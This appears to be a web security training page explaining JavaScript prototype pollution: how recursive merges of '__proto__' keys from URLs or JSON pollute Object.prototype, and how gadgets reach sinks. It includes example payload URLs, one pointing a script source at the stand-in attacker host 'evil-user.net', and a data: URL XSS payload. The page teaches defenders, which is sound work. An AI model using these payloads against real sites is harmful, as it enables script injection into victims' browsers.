1. [Web Security Academy](/web-security)  
2. [Prototype pollution](/web-security/prototype-pollution)  
  
# What is prototype pollution?  
  
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.   
Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to [DOM XSS](/web-security/cross-site-scripting/dom-based), while server-side prototype pollution can even result in remote code execution.   
If you're unfamiliar with how prototypes and inheritance work in JavaScript, we recommend reading the following overview before continuing.   
[JavaScript prototypes and inheritance](/web-security/prototype-pollution/javascript-prototypes-and-inheritance)  
  
#### Labs  
  
If you're already familiar with prototype pollution and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic.   
  
1. [LABS View all prototype pollution labs](/web-security/all-labs#prototype-pollution)  
  
## How do prototype pollution vulnerabilities arise?  
  
Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.   
Due to the [special meaning of `__proto__`](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto) in a JavaScript context, the merge operation may assign the nested properties to the object's [prototype](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript) instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.   
It's possible to pollute any prototype object, but this most commonly occurs with the [built-in global `Object.prototype`](/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain).   
Successful exploitation of prototype pollution requires the following key components:   
  
1. [A prototype pollution source](/web-security/prototype-pollution#prototype-pollution-sources) \- This is any input that enables you to poison prototype objects with arbitrary properties.   
2. [A sink](/web-security/prototype-pollution#prototype-pollution-sinks) \- In other words, a JavaScript function or DOM element that enables arbitrary code execution.   
3. [An exploitable gadget](/web-security/prototype-pollution#prototype-pollution-gadgets) \- This is any property that is passed into a sink without proper filtering or sanitization.   
  
## Prototype pollution sources  
  
A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:   
  
1. The [URL](/web-security/prototype-pollution#prototype-pollution-via-the-url) via either the query or fragment string (hash)   
2. [JSON-based input](/web-security/prototype-pollution#prototype-pollution-via-json-input)  
3. Web messages   
  
### Prototype pollution via the URL  
  
Consider the following URL, which contains an attacker-constructed query string:   
`https://vulnerable-website.com/?__proto__[evilProperty]=payload`  
When breaking the query string down into `key:value` pairs, a URL parser may interpret `__proto__` as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.   
You might think that the `__proto__` property, along with its nested `evilProperty`, will just be added to the target object as follows:   
`{ existingProperty1: 'foo', existingProperty2: 'bar', __proto__: { evilProperty: 'payload' } }`  
However, this isn't the case. At some point, the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:   
`targetObject.__proto__.evilProperty = 'payload';`  
During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key.   
In practice, injecting a property called `evilProperty` is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.   
  
### Prototype pollution via JSON input  
  
User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. Interestingly, `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution.   
Let's say an attacker injects the following malicious JSON, for example, via a web message:   
`{ "__proto__": { "evilProperty": "payload" } }`  
If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`:   
`const objectLiteral = {__proto__: {evilProperty: 'payload'}}; const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true`  
If the object created via `JSON.parse()` is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous [URL-based example](/web-security/prototype-pollution#prototype-pollution-via-the-url).   
  
## Prototype pollution sinks  
  
A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on [DOM XSS](/web-security/cross-site-scripting/dom-based).   
As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.   
  
## Prototype pollution gadgets  
  
A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:   
  
1. Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.   
2. Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.   
A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. [Robust websites](/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties) may also explicitly set the prototype of the object to `null`, which ensures that it doesn't inherit any properties at all.   
  
### Example of a prototype pollution gadget  
  
Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:   
`let transport_url = config.transport_url || defaults.transport_url;`  
Now imagine the library code uses this `transport_url` to add a script reference to the page:   
`let script = document.createElement('script'); script.src = `${transport_url}/example.js`; document.body.appendChild(script);`  
If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.   
If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:   
`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`  
By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows:   
`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`  
Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.   
  
### What next?  
  
Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications:   
  
1. [LABS Client-side prototype pollution vulnerabilities](/web-security/prototype-pollution/client-side)
2. [LABS Server-side prototype pollution vulnerabilities](/web-security/prototype-pollution/server-side)
3. [Preventing prototype pollution vulnerabilities](/web-security/prototype-pollution/preventing)
